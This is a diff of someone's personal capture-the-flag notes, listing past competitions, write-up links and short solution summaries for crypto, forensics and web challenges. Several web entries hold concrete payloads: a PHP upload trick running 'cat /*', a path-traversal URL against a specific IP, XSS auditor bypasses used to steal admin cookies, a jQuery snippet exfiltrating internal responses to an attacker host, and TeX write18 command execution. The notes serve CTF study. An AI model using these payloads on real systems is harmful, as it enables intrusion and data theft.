@@ -8,11 +8,14 @@ https://github.com/abpolym/route2ctf/ # keywords <=> writeup mappings
 https://github.com/apsdehal/awesome-ctf
 https://github.com/zardus/ctf-tools http://www.kitploit.com/2016/03/ctf-tools-some-setup-scripts-for.html
 
+# still online
+https://backdoor.sdslabs.co/challenges
+
 # general notes
 for csaw challs & writeups of all past CTFs: https://github.com/isislab/ (was https://ctf.isis.poly.edu/writeups/)
 has all writeups for ndh and volgactf: http://sigint.ru/writeups/
 
-# gone over (skipped pwn & reverse tasks)
+# gone over (skipped pwn & reverse tasks) {{{
 * pico-ctf-2013
 * boston-key-party-2014
 * codegate-preliminary-2014
@@ -88,9 +91,25 @@ javascript and clojure sandbox escapes
 * thailand-ctf-2015 no writeups
 * trend-micro-ctf-2015
 * volgactf-quals-2015
-
 * 0ctf-2016
+* alictf-2016
+* angstromctf-2016
+* asis-ctf-2016
+* asis-ctf-quals-2016
+* backdoor-ctf-2016
+* bctf-2016
+* bioterra-ctf-2016
+* blaze-ctf-2016
+* boston-key-party-2016
+* breakin-ctf-2016
+* codegate-ctf-2016
+* csaw-ctf-2016-quals
+* ctfx-2016
+* cyber-security-challenge-belgium-2016-qualifiers
+
 * ndh-quals-2016
+
+# }}}
 
 # writeups / to read {{{
 https://github.com/VulnHub/ctf-writeups
@@ -101,9 +120,15 @@ https://github.com/73696e65/ctf-notes
 
 * blogs
 https://w00tsec.blogspot.com.au/ https://github.com/bmaia/
-https://ctf.rip/ CaptureTheSwag
-https://0day.work/ InternetWache
-http://tasteless.eu/ Tasteless
+CaptureTheSwag https://ctf.rip/ https://github.com/sourcekris/ctf-solutions
+InternetWache https://0day.work/
+Tasteless http://tasteless.eu/
+LC!BC http://mslc.ctf.su/ More Smoked Leet Chicken (leetmore.ctf.su + smokedchicken.org) (now merged with BalalaikaCr3w as LC!BC)
+BalalaikaCr3w https://ctfcrew.org/
+Fourchette Bombe https://github.com/JulesDT http://0xecute.com/
+khack40 http://khack40.info/
+Raccoons https://github.com/raccoons-team/ctf/
+https://kt.pe/blog/ kt (ex SpamAndHex! captain)
 
 * crypto
 https://grocid.net
@@ -670,6 +695,29 @@ huge public exponent may mean small private exponent
 use Wiener's attack to recover the private exponent
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/crypto/rsa
 
+* collision course - backdoor-ctf-2016
+solve Merkle-Damgård-like hashing structure via bruteforce: test all x so that B0 == H(x) << 7
+then take the next block and solve (H(x) ^ B0) << 7 and so on
+https://github.com/ctfs/write-ups-2016/tree/master/backdoor-ctf-2016/crypto/collision-course-350
+
+* forge - backdoor-ctf-2016
+part1: crc32 collisions, submit 5 pngs with identical pixels and the same crc32 as the provided png
+part2: md5 collisions, submit 8 files having the same MD5. Use fastcol https://marc-stevens.nl/research/
+https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_forge
+
+* baby - backdoor-ctf-2016
+Bleicherbacher e=3 RSA Attack against signature verification
+https://grocid.net/2016/06/05/backdoorctf16-baby/
+
+* crc - backdoor-ctf-2016
+many encrypted zip files that uncompress to 5 byte files
+we can brute force each file contents because ZIPs contain CRC32 of their uncompressed files
+https://github.com/ctfs/write-ups-2016/tree/master/backdoor-ctf-2016/crypto/crc-250
+
+* mindblown - backdoor-ctf-2016
+PBKDF2 + HMAC collision
+https://mathiasbynens.be/notes/pbkdf2-hmac http://rawsec.ml/en/writeups-crypto-mindblown/
+
 * level0x3 - eff-ctf-2016
 one letter is "encrypted" into 4 numbers but the sum of all 4 numbers is always the same value
 
@@ -726,6 +774,14 @@ find collision for custom hash
 
 * eso-tape - internetwache-ctf-2016
 implement an interpreter for the TapeBagel esoteric language
+
+* hmac crc - boston-key-party-2016
+rewrite inner CRC as a polynomial mod CRC_POLY so we can rewrite HMAC as a polynomial
+https://github.com/DeliciousHorse/2016.03.BostonKeyParty/blob/master/hmac_crc.md
+atl solution: hmac is linear
+when we flip one bit in key, all bits of the output depending on this bit also flip with no matter of other bits in key
+use gauss-jordan algorithm to compute which bits in key need to flip if I want flip one bit in signature at given position
+https://github.com/raccoons-team/ctf/tree/master/2016-03-07-boston-key-party-ctf/crypto_5_hmac_crc
 
 * des ofb - boston-key-party-2016
 des in stream cipher mode with a weak key == keystream repetition
@@ -812,6 +868,19 @@ we need to provide the number of primes and perfect powers in a given range
 ranges are small so we can just iterate and use gmpy2.is_prime and gmpy2.is_power
 https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/secu_prim
 
+* only9 - asis-ctf-2016
+encryption oracle with sbox + matrix and a 9 round key schedule
+solve with square attack:
+Pick an index i and 256 plaintexts P_k that all differ in byte i, but coincide
+in all indexes j != i. Then after 8 rounds, the i-th byte of the XOR of all
+ciphertexts C_k of P_k is 0. We can use this to mount a square attack
+The final ciphers after 9 rounds are C'_k = M*(SBOX(C_k)) ^ K where K is the
+last round key. This can be rewritten as C_k = SBOX^-1((M^-1 * C'_k) ^ (M^-1 * K))
+We can use the characteristic from above to brute force the i-th byte of
+M^-1 * K. Do this for all i to get K completely. Then reconstruct the original
+key from it by reversing the key schedule.
+https://github.com/kitctf/writeups/blob/master/asis-finals-2016/only9/solve.py
+
 * races - asis-ctf-2016
 combination of ECC and RSA (ECRSA)
 flag encrypted with a lot of public keys, use gmpy2 to find two public rsa keys that share the same prime and factor them
@@ -844,6 +913,11 @@ we use LLL-based attack when more than quarter of the secret exponent bits are k
 after finding 300 least significant bits of p, we can use Coppersmith method for finding small roots of polynomials modulo p
 http://mslc.ctf.su/wp/csaw-quals-2016-broken-box-crypto-300-400/
 https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/still_broken_box
+
+* h4ckit-ctf-2016
+custom Rijndael with 3 elements of the SBox where swapped around
+we have ciphertext + key, use c++ prog to bruteforce SBox and SInvBox to recover flag (5M possibilities)
+https://github.com/JulesDT/ctfWriteUps/tree/master/Hackit%20Quals%202016/Handmade%20encryption%20standard%20-%20Crypto%20-%20250%20pts
 
 # }}}
 
@@ -1027,7 +1101,17 @@ for x in provided:
 
 * p1ng - asis-ctf-2016
 animated png (APNG), unpack all frames
-https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/p1ng
+https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-2016/forensic/p1ng-121
+
+* television - backdoor-ctf-2016
+xor image i with image i+1, then xor resulting image with i+2 and so on
+https://github.com/p4-team/ctf/blob/master/2016-06-04-backdoor-ctf/stegano_television/README.md
+
+* lossless - backdoor-ctf-2016
+compare original.png encrypted.png diff.png -> images differ only in the top right corne
+or use https://futureboy.us/stegano/compinput.html to enhance clarity
+49x7 binary matrix, strings with blue=1 and black=0, 7 rows -> 1 ascii char per column
+http://www.codilime.com/backdoorctf16-lossless/
 
 * brainfun - csaw-ctf-2016
 the alpha values are in the printable ascii range
@@ -1061,7 +1145,7 @@ cracking firmware 5-char password fast because we know the plaintext magic 3-byt
 https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/forensics/config-bin-150
 
 * broken heart - asis-quals-ctf-2015
-tcpflow or dshell or re-assemble file split in multiple Content-Range responses
+tcpflow or dshell or re-assemble file split in multiple Content-Range responses, of fragments and packets in wrong order
 https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/forensic/broken-heart
 
 * zrypt - asis-quals-ctf-2015
@@ -1109,6 +1193,18 @@ use Diskinternals EFS recovery to mount given iso as raw disk image
 volume name which contains the password
 https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/forensics/russiandoll
 
+* dtune - backdoor-ctf-2016
+audio file with sounds of phone dial tones
+use http://dialabc.com/sound/detect/ to parse DTMF or audacity plugin to find which numbers were pressed
+then T9-decode numbers to get flag
+https://github.com/ctfs/write-ups-2016/tree/master/backdoor-ctf-2016/stego/dtune-70
+
+* upload - bctf-2016
+btrfs image
+restore the snapshots with btrfs restore -si disk.img blah
+list the trees with btrfs restore -l disk.img and extract with btrfs restore -r 278 disk.img blah2
+https://www.xil.se/post/bctf-2016-upload-forensics-kbeckmann/
+
 * catch me if you can - nullcon-hackim-2016 
 matryoshka compression doll
 https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/forensics/catchmeifyoucan-100
@@ -1120,8 +1216,8 @@ nice use of scapy to extract User-Agent and download file (with parts out of ord
 reconstructing a png from sqlite, had to reorder the IDAT chunks
 https://www.xil.se/post/sharifctf-2016-forensics-blocks-arturo182/
 
-* asis-quals-ctf-2016
-TweakPNG windows gui tool to reorder IDAT chunks and easily review the result
+* odrrere - asis-quals-ctf-2016
+use TweakPNG windows GUI tool to reorder IDAT chunks and easily review the result
 http://lockboxx.blogspot.com.au/2016/05/asis-ctf-2016-quals-writeup-odrrere.html
 
 * memdump - su-ctf-2016
@@ -1131,7 +1227,7 @@ packed PE use DiE to find packer, then OllyDbg to unpack (or use https://retdec.
 dtmf tones in webm file
 mediainfo to see what contains the webm file
 avconf to extract second track
-multimon-ng to parse DTMF tones
+multimon-ng to parse DTMF tones ./multimon-ng -t wav -a DTMF msg.wav
 https://www.xil.se/post/internetwache-2016-crypto-80-arturo182/
 https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-crypto-80-procrastination-write-up/
 
@@ -1370,6 +1466,13 @@ https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/kummerkaste
 timing attack because sleep() blocks further requests
 https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/sequence-hunt-200
 
+* tinyhosting - 32c3-ctf-2015
+php short tags
+can upload .php files but content restricted to 7 chars
+upload files bash and bash2 (bash2 contains cat /*) and upload woot.php with <?=`*`;
+accessing woot.php will execute bash bash2 index.html ...
+https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/tiny_hosting_web_250#eng-version
+
 * webchat - bctf-2015
 sqli + xss
 sqli in INSERT and use char() to bypass blacklisted chars [<>...]
@@ -1427,6 +1530,10 @@ https://github.com/ctfs/write-ups-2015/tree/master/nullcon-hackim-2015/web-5
 website lists hyperboria peers, install cjdns and access website via its hyperboria ipv6 address
 http://capturetheswag.blogspot.com.au/2015/04/uiuctf-2015-hype-web-challenge.html
 
+* clue - backdoor-ctf-2016
+private github repo can be accessed through gh-pages: user.github.io/repo-name/flag
+http://b0tchsec.com/2016/backdoorctf/clue
+
 * can you hit me - ssctf-2016
 angularjs sandbox bypass -> xss
 https://github.com/ctfs/write-ups-2016/tree/master/ssctf-2016/web/can-you-hit-me-200
@@ -1466,30 +1573,39 @@ bypass csp with
 <meta http-equiv="refresh" content="0; url=http://me/i">
 https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/web/bug-bounty-3
 
-* rand 2 - 0ctf-2016
-recover seed of rand based on sessionid
-https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rand_2
+* rand - 0ctf-2016
+recover php rand() seed within 1 minute, given the first number and the md5 of the five next numbers
+php seeds rand() with (((long) (time(0) * getpid())) ^ ((long) (1000000.0 * php_combined_lcg(TSRMLS_C))))
+we can use the Date: header and just bruteforce the pid (standard pid_max is 32768)
+php reuses seeds in existing mod_php processes so established 20 connections to ensure we get numbers from a fresh Apache child
+trying all possible pids took a lot longer than one minute, but once found the first valid pid we can predict what range the next pid will be and greatly reduce the number of tries required
+https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rand_2 http://dragonsector.pl/docs/0ctf2016_writeups.pdf
 
 * monkey - 0ctf-2016
 proof of work in Go
 DNS rebinding to bypass CORS
+https://w00tsec.blogspot.com.au/2016/03/0ctf-2016-write-up-monkey-web-4.html
 
 * guestbook - 0ctf-2016
-xss and chrome xss auditor trick
-POST with secret=blah<script>var+debug=false;</script>, xss auditor will detect and block the assignment in the respose
-POST with username=debug to define the var to true
+part1: xss and chrome xss auditor bypass trick
+use innerHTML to execute JavaScript
+bypass filter() with hexadecimal/unicode escape sequences
+pass username=debug to define the JS variable debug to true because our username will be reflected as <div id="debug"> and in Chrome, HTML element with ID will be automatically available in JS
+and pass secret=<script>var+debug=false;</script> so that Chrome xss auditor will think that debug=false is controlled by attacker and will ignore initialization
+xss admin to send us content of phpinfo page which will contain httponly cookie
 http://security.szurek.pl/0ctf-2016-guestbook-1-writeup.html
-ssrf to redis to upload files
-trick to bypass disable_function: upload .so and .php with
-https://blog.ka0labs.net/post/33/
+part2: ssrf to redis to upload files
+trick to bypass disable_function: upload .so and .php with https://blog.ka0labs.net/post/33/
 
 * zerodaystore - bctf-2016
 b64decode doesn't "safe decode" (ignores any non-base64 stuff after the base64 string)
-so just had to submit price=1337&sign=YTFiMmMzZDRlNWY2Cg==&price=0 to override price to 0
+bypass signature check by submitting price=1337&sign=YTFiMmMzZDRlNWY2Cg==&price=0 to override price to 0
+because b64decode(b64encode("test")+"&price=0") => 'test'
+https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BCTF/misc/zerodaystore
  
 * qaq - bctf-2016
 xss and CORS
-use jquery to exfil responses (without CORS: * we could not read responses due to SOP)
+use jquery to exfil responses from internal server
 comment payload: <iframe src="http://our.ip/"/> and index.html:
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 <script type="text/javascript" charset="utf-8">
@@ -1501,6 +1617,10 @@ jQuery.get( "http://172.17.0.2/", function(data) {
 * homework - bctf-2016
 sqli through xss
 https://www.ibrahim-elsayed.com/?p=214
+
+* js is not a jail - codegate-ctf-2016
+javascript jail
+https://github.com/ctfs/write-ups-2016/tree/master/codegate-ctf-2016/web/js-is-no-a-jail
 
 * bathing and grooming - pwn2win-ctf-2016
 sqli in sqlite, implement MD5 in pure SQL
@@ -1553,6 +1673,13 @@ https://gist.github.com/stypr/30b0a68b69dbf54d20e420e2b415f8ca
 command injection in php assert(): assert("strpos('$file', '..') === false") or die();
 exploit with ?file=') || var_dump(file_get_contents('flag.php'));//
 
+* angry seam - hitcon-ctf-quals-2016
+local file disclosure via http://52.198.197.227:8080/angryseam/css.seam?location=../../../WEB-INF/web.xml
+
+* cyber-security-challenge-belgium-2016-qualifiers
+enter websocket code in browser console to submit fake score
+https://github.com/ctfs/write-ups-2016/tree/master/cyber-security-challenge-belgium-2016-qualifiers/Web%20Security/Tap-dat-ass-part1
+
 # }}}
 
 # reverse {{{
@@ -1592,10 +1719,13 @@ boot vm on gparted iso to copy mbr to disk, then remote gdb of vmware vm
 https://securite.intrinsec.com/2016/04/03/write-up-nuit-du-hack-2016-ctf-quals-matriochka-step-4/
 
 * three magic - asis-ctf-2016
-rce with {grep,-nrw,.} to leak src and mt_rand bf
+command injection with restricted chars, use {grep,-nrw,.} to leak src
+recover seed of php mt_rand() within 3 minutes with http://www.openwall.com/php_mt_seed/
+https://thegoonies.rocks/asis-ctf-three-magic-web/
 
 * binarycloud - asis-ctf-2016
 php7 opcache and using http://vulnsite.com///upload.php?blacklistedword to bypass parse_url() (returns false)
+https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-quals-2016/web/binary-cloud-153
 
 # }}}
 
@@ -1631,7 +1761,14 @@ https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/misc/b
 binary tree
 https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/code/dark-forest-90
 
-* hsab - bctp-2016
+* texmaker - internetwache-ctf-2016
+web interface creates pdf files using pdfTeX
+in TeX we can RCE with operation \immediate\write18{ls}
+another way was to just include the flag file, there many ways to do this
+https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/web/texmaker-90
+https://0day.work/hacking-with-latex/
+
+* hsab - bctf-2016
 restricted bash shell with no binaries but with ctypes.sh of Taviso (builtins=([0]="callback" [1]="dlcall" etc. in set's output)
 solution alternative: history -r /home/ctf/flag.ray; history
 https://ctf.rip/bctf-2016-hsab-misc-category-challenge/
